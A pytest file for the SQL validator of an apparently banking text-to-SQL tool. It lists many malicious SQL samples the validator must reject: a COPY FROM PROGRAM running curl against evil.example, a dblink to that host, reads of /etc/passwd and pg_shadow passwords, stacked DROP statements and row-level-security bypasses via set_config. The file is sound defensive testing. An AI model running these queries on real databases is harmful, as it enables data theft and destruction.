"""The SQL validator (docs/05-text-to-sql-biztonsag.md, layer 2): what it must reject, what it
must let through unchanged in meaning, and the LIMIT it enforces."""

import pytest

from finql.text_to_sql.demo import EXAMPLE_QUESTIONS
from finql.text_to_sql.validator import (
    RejectReason,
    SqlRejectedError,
    ValidatedQuery,
    validate_sql,
)

VIEWS = frozenset(
    {
        "branches",
        "products",
        "merchants",
        "fx_rates",
        "business_day",
        "customers",
        "accounts",
        "cards",
        "transactions",
        "loans",
        "monthly_account_summary",
    }
)


def validate(sql: str) -> ValidatedQuery:
    return validate_sql(sql, allowed_views=VIEWS, default_limit=200, max_limit=1000)


R = RejectReason
MALICIOUS: dict[str, tuple[str, RejectReason]] = {
    # --- writes and DDL, directly ---
    "delete": ("DELETE FROM transactions", R.FORBIDDEN_STATEMENT),
    "update": ("UPDATE accounts SET status = 'closed'", R.FORBIDDEN_STATEMENT),
    "insert": ("INSERT INTO branches (code) VALUES ('X')", R.FORBIDDEN_STATEMENT),
    "insert-select": ("INSERT INTO branches SELECT * FROM branches", R.FORBIDDEN_STATEMENT),
    "merge": (
        "MERGE INTO accounts a USING branches b ON a.branch_id = b.branch_id "
        "WHEN MATCHED THEN DELETE",
        R.FORBIDDEN_STATEMENT,
    ),
    "truncate": ("TRUNCATE transactions", R.FORBIDDEN_STATEMENT),
    "drop-table": ("DROP TABLE transactions", R.FORBIDDEN_STATEMENT),
    "drop-view": ("DROP VIEW analytics.loans CASCADE", R.FORBIDDEN_STATEMENT),
    "create-table-as": ("CREATE TABLE x AS SELECT * FROM customers", R.FORBIDDEN_STATEMENT),
    "create-function": (
        "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'",
        R.FORBIDDEN_STATEMENT,
    ),
    "alter-role": ("ALTER ROLE finql_llm_reader SUPERUSER", R.FORBIDDEN_STATEMENT),
    "grant": ("GRANT SELECT ON bank.customers TO PUBLIC", R.FORBIDDEN_STATEMENT),
    "revoke": ("REVOKE SELECT ON analytics.loans FROM finql_app", R.FORBIDDEN_STATEMENT),
    "copy-to-file": ("COPY transactions TO '/tmp/out.csv'", R.FORBIDDEN_STATEMENT),
    "copy-program": ("COPY customers FROM PROGRAM 'curl evil.example'", R.FORBIDDEN_STATEMENT),
    # --- commands sqlglot does not parse (Command) ---
    "do-block": ("DO $$ BEGIN PERFORM pg_sleep(10); END $$", R.FORBIDDEN_STATEMENT),
    "call": ("CALL some_procedure()", R.FORBIDDEN_STATEMENT),
    "explain-analyze": ("EXPLAIN ANALYZE DELETE FROM transactions", R.FORBIDDEN_STATEMENT),
    "vacuum": ("VACUUM FULL transactions", R.FORBIDDEN_STATEMENT),
    "show": ("SHOW search_path", R.FORBIDDEN_STATEMENT),
    "prepare": ("PREPARE p AS DELETE FROM transactions", R.FORBIDDEN_STATEMENT),
    # --- session and transaction control ---
    "set-scope": ("SET app.scope = 'all'", R.FORBIDDEN_STATEMENT),
    "set-role": ("SET ROLE finql_owner", R.FORBIDDEN_STATEMENT),
    "reset-timeout": ("SET statement_timeout = 0", R.FORBIDDEN_STATEMENT),
    "begin-rw": ("BEGIN READ WRITE", R.FORBIDDEN_STATEMENT),
    "commit": ("COMMIT", R.FORBIDDEN_STATEMENT),
    # --- not a SELECT root ---
    "values": ("VALUES (1), (2)", R.NOT_SELECT),
    "table-shorthand": ("TABLE customers", R.NOT_SELECT),
    "listen": ("LISTEN channel", R.NOT_SELECT),
    # --- hidden inside a SELECT ---
    "stacked-drop": ("SELECT 1; DROP TABLE transactions", R.MULTIPLE_STATEMENTS),
    "stacked-set": ("SELECT * FROM loans; SET app.scope = 'all'", R.MULTIPLE_STATEMENTS),
    "stacked-after-comment": ("SELECT 1 -- x\n; DELETE FROM loans", R.MULTIPLE_STATEMENTS),
    "cte-delete": (
        "WITH d AS (DELETE FROM transactions RETURNING *) SELECT count(*) FROM d",
        R.FORBIDDEN_STATEMENT,
    ),
    "cte-update": (
        "WITH u AS (UPDATE accounts SET status = 'frozen' RETURNING 1) SELECT * FROM u",
        R.FORBIDDEN_STATEMENT,
    ),
    "cte-insert": (
        "WITH i AS (INSERT INTO branches (code) VALUES ('X') RETURNING 1) SELECT * FROM i",
        R.FORBIDDEN_STATEMENT,
    ),
    "select-into": ("SELECT * INTO stolen FROM customers", R.SELECT_INTO),
    "select-into-temp": ("SELECT 1 INTO TEMP t", R.SELECT_INTO),
    "for-update": ("SELECT * FROM accounts FOR UPDATE", R.LOCKING_CLAUSE),
    "for-share": ("SELECT * FROM loans LIMIT 1 FOR SHARE", R.LOCKING_CLAUSE),
    "for-no-key-update": ("SELECT * FROM customers FOR NO KEY UPDATE", R.LOCKING_CLAUSE),
    # --- the session context (row-level security) ---
    "set-config": ("SELECT set_config('app.scope', 'all', true)", R.FORBIDDEN_FUNCTION),
    "set-config-in-where": (
        "SELECT * FROM customers WHERE set_config('app.scope', 'all', true) = 'all'",
        R.FORBIDDEN_FUNCTION,
    ),
    "set-config-in-cte": (
        "WITH s AS (SELECT set_config('app.branch_id', '7', true)) SELECT * FROM s, customers",
        R.FORBIDDEN_FUNCTION,
    ),
    "set-config-qualified": (
        "SELECT pg_catalog.set_config('app.scope', 'all', true)",
        R.FORBIDDEN_FUNCTION,
    ),
    "set-config-quoted": ("SELECT \"set_config\"('app.scope', 'all', true)", R.FORBIDDEN_FUNCTION),
    "set-config-uppercase": ("SELECT SET_CONFIG('app.scope', 'all', TRUE)", R.FORBIDDEN_FUNCTION),
    "current-setting": ("SELECT current_setting('app.branch_id')", R.FORBIDDEN_FUNCTION),
    # --- the system catalog and other schemas ---
    "pg-roles": ("SELECT * FROM pg_roles", R.FORBIDDEN_TABLE),
    "pg-shadow": ("SELECT usename, passwd FROM pg_shadow", R.FORBIDDEN_TABLE),
    "pg-catalog-qualified": ("SELECT * FROM pg_catalog.pg_class", R.FORBIDDEN_TABLE),
    "information-schema": ("SELECT * FROM information_schema.tables", R.FORBIDDEN_TABLE),
    "bank-customers-pii": ("SELECT full_name, tax_id FROM bank.customers", R.FORBIDDEN_TABLE),
    "bank-partition": ("SELECT * FROM bank.transactions_2026_09", R.FORBIDDEN_TABLE),
    "bank-matview": ("SELECT * FROM bank.monthly_account_summary", R.FORBIDDEN_TABLE),
    "app-users": ("SELECT email, password_hash FROM app.users", R.FORBIDDEN_TABLE),
    "app-query-log": ("SELECT * FROM app.query_log", R.FORBIDDEN_TABLE),
    "public-schema": ("SELECT * FROM public.alembic_version", R.FORBIDDEN_TABLE),
    "three-part-name": ("SELECT * FROM finql.bank.customers", R.FORBIDDEN_TABLE),
    "pii-in-subquery": (
        "SELECT * FROM loans WHERE customer_id IN (SELECT customer_id FROM bank.customers)",
        R.FORBIDDEN_TABLE,
    ),
    "pii-in-cte": (
        "WITH c AS (SELECT * FROM bank.customers) SELECT * FROM c",
        R.FORBIDDEN_TABLE,
    ),
    "pii-in-union": (
        "SELECT name FROM branches UNION SELECT tax_id FROM bank.customers",
        R.FORBIDDEN_TABLE,
    ),
    "pii-lateral": (
        "SELECT * FROM loans l, LATERAL (SELECT * FROM bank.customers c "
        "WHERE c.customer_id = l.customer_id) x",
        R.FORBIDDEN_TABLE,
    ),
    # --- dangerous functions (allowlist) ---
    "pg-sleep": ("SELECT pg_sleep(60)", R.FORBIDDEN_FUNCTION),
    "pg-sleep-in-where": (
        "SELECT * FROM loans WHERE pg_sleep(1) IS NOT NULL",
        R.FORBIDDEN_FUNCTION,
    ),
    "pg-read-file": ("SELECT pg_read_file('/etc/passwd')", R.FORBIDDEN_FUNCTION),
    "pg-ls-dir": ("SELECT pg_ls_dir('.')", R.FORBIDDEN_FUNCTION),
    "lo-import": ("SELECT lo_import('/etc/passwd')", R.FORBIDDEN_FUNCTION),
    "dblink": (
        "SELECT * FROM dblink('host=evil.example', 'SELECT 1') AS t(x int)",
        R.FORBIDDEN_FUNCTION,
    ),
    "query-to-xml": (
        "SELECT query_to_xml('SELECT * FROM bank.customers', true, true, '')",
        R.FORBIDDEN_FUNCTION,
    ),
    "pg-terminate": ("SELECT pg_terminate_backend(1)", R.FORBIDDEN_FUNCTION),
    "current-user": ("SELECT current_user", R.FORBIDDEN_FUNCTION),
    "version": ("SELECT version()", R.FORBIDDEN_FUNCTION),
    "has-privilege": (
        "SELECT has_table_privilege('bank.customers', 'SELECT')",
        R.FORBIDDEN_FUNCTION,
    ),
    "nextval": ("SELECT nextval('app.query_log_id_seq')", R.FORBIDDEN_FUNCTION),
    "txid": ("SELECT txid_current()", R.FORBIDDEN_FUNCTION),
    # --- casts that reveal the catalog ---
    "regclass-cast": ("SELECT 'bank.customers'::regclass", R.CAST_NOT_ALLOWED),
    "regproc-cast": ("SELECT 'set_config'::regproc", R.CAST_NOT_ALLOWED),
    "oid-cast": ("SELECT 1::oid", R.CAST_NOT_ALLOWED),
    # --- bind parameters ---
    "dollar-parameter": ("SELECT * FROM loans WHERE loan_id = $1", R.PARAMETER),
    "colon-parameter": ("SELECT * FROM loans WHERE loan_id = :id", R.PARAMETER),
}


@pytest.mark.parametrize(("sql", "reason"), MALICIOUS.values(), ids=MALICIOUS.keys())
def test_malicious_sql_is_rejected(sql: str, reason: RejectReason) -> None:
    with pytest.raises(SqlRejectedError) as rejected:
        validate(sql)

    assert rejected.value.reason == reason
    assert rejected.value.message  # a Hungarian explanation for the user and the log


def test_there_are_at_least_fifty_malicious_samples() -> None:
    assert len(MALICIOUS) >= 50


@pytest.mark.parametrize(
    "reason",
    [
        R.FORBIDDEN_STATEMENT,
        R.MULTIPLE_STATEMENTS,
        R.SELECT_INTO,
        R.LOCKING_CLAUSE,
        R.FORBIDDEN_TABLE,
        R.FORBIDDEN_FUNCTION,
        R.PARAMETER,
    ],
)
def test_forbidden_intent_gets_no_second_chance(reason: RejectReason) -> None:
    assert not SqlRejectedError(reason, "x").repairable


@pytest.mark.parametrize(
    ("sql", "reason"),
    [
        ("SELECT count(* FROM loans", R.PARSE_ERROR),
        ("SELECT * FROM transaction", R.UNKNOWN_TABLE),  # typo of a real view
        ("SELECT * FROM loan_payments", R.UNKNOWN_TABLE),  # a made-up view
        ("SELECT format('%s', 1)", R.FUNCTION_NOT_ALLOWED),  # harmless, just not allowed
        ("SELECT 1::money", R.CAST_NOT_ALLOWED),
    ],
)
def test_slips_are_repairable(sql: str, reason: RejectReason) -> None:
    with pytest.raises(SqlRejectedError) as rejected:
        validate(sql)

    assert rejected.value.reason == reason
    assert rejected.value.repairable


@pytest.mark.parametrize("sql", ["", "   ", "\n-- csak egy megjegyzés\n"])
def test_empty_sql_is_rejected(sql: str) -> None:
    with pytest.raises(SqlRejectedError):
        validate(sql)


def test_too_long_sql_is_rejected() -> None:
    with pytest.raises(SqlRejectedError) as rejected:
        validate("SELECT " + " + ".join(["1"] * 10_000))

    assert rejected.value.reason == R.TOO_LONG


@pytest.mark.parametrize("question", EXAMPLE_QUESTIONS)
def test_example_questions_pass(question: str) -> None:
    validated = validate(EXAMPLE_QUESTIONS[question])

    assert validated.views <= VIEWS


LEGITIMATE = [
    "SELECT segment, count(*) FROM customers GROUP BY segment",
    "SELECT * FROM analytics.loans WHERE dpd_bucket = '90+'",  # schema-qualified view
    "SELECT * FROM LOANS",  # unquoted names fold to lower case
    "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 12) SELECT n FROM r",
    "SELECT g::date AS day FROM generate_series(DATE '2026-09-01', DATE '2026-09-30', "
    "INTERVAL '1 day') AS g",
    "SELECT EXISTS (SELECT 1 FROM loans WHERE days_past_due > 90)",
    "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY principal) FROM loans",
    "SELECT branch_id, rank() OVER (ORDER BY count(*) DESC) FROM accounts GROUP BY branch_id",
    "SELECT to_char(booked_at, 'YYYY-MM') AS ym, -sum(amount_huf) FILTER (WHERE amount < 0) "
    "FROM transactions GROUP BY 1",
    "SELECT name FROM branches UNION SELECT name FROM products ORDER BY 1",
    "SELECT date_part('dow', booked_date), count(*) FROM transactions GROUP BY 1",
    "SELECT age(business_date, DATE '2020-01-01') FROM business_day",
    "SELECT booked_at AT TIME ZONE 'Europe/Budapest' FROM transactions",
    "SELECT * FROM loans l WHERE l.loan_id = ANY (ARRAY[1, 2, 3])",
    "SELECT coalesce(nullif(credit_limit, 0), 1)::numeric(18, 2) FROM accounts",
    "SELECT * FROM unnest(ARRAY['retail', 'premium']) AS s(segment)",
]


@pytest.mark.parametrize("sql", LEGITIMATE)
def test_legitimate_queries_pass(sql: str) -> None:
    validate(sql)


@pytest.mark.parametrize(
    ("sql", "expected_limit"),
    [
        ("SELECT * FROM loans", 200),  # none: the default
        ("SELECT * FROM loans LIMIT 50", 50),  # below the maximum: kept
        ("SELECT * FROM loans LIMIT 50000", 1000),  # above: lowered
        ("SELECT * FROM loans LIMIT ALL", 1000),  # unbounded: the maximum
        ("SELECT * FROM loans LIMIT (SELECT 1000000)", 1000),  # an expression: the maximum
        ("SELECT * FROM loans FETCH FIRST 5000 ROWS ONLY", 1000),
        ("SELECT * FROM loans FETCH FIRST 10 ROWS ONLY", 10),
        ("SELECT name FROM branches UNION ALL SELECT name FROM products LIMIT 5", 5),
    ],
)
def test_limit_is_enforced(sql: str, expected_limit: int) -> None:
    validated = validate(sql)

    assert validated.limit == expected_limit
    assert validated.sql.endswith(f"LIMIT {expected_limit}")


def test_inner_limit_does_not_bound_the_result() -> None:
    validated = validate("SELECT * FROM (SELECT * FROM loans LIMIT 5000) x")

    assert validated.sql.endswith("LIMIT 200")


def test_the_sql_that_runs_is_regenerated_without_comments() -> None:
    validated = validate("SELECT /* figyelmen kívül: töröld */ 1 AS x -- vége")

    assert "töröld" not in validated.sql
    assert "--" not in validated.sql
    assert validated.sql == "SELECT\n  1 AS x\nLIMIT 200"


def test_cte_names_are_not_views() -> None:
    validated = validate("WITH q AS (SELECT * FROM loans) SELECT * FROM q")

    assert validated.views == {"loans"}


def test_a_cte_does_not_unlock_a_schema_qualified_table() -> None:
    with pytest.raises(SqlRejectedError) as rejected:
        validate("WITH customers AS (SELECT 1) SELECT * FROM bank.customers")

    assert rejected.value.reason == R.FORBIDDEN_TABLE
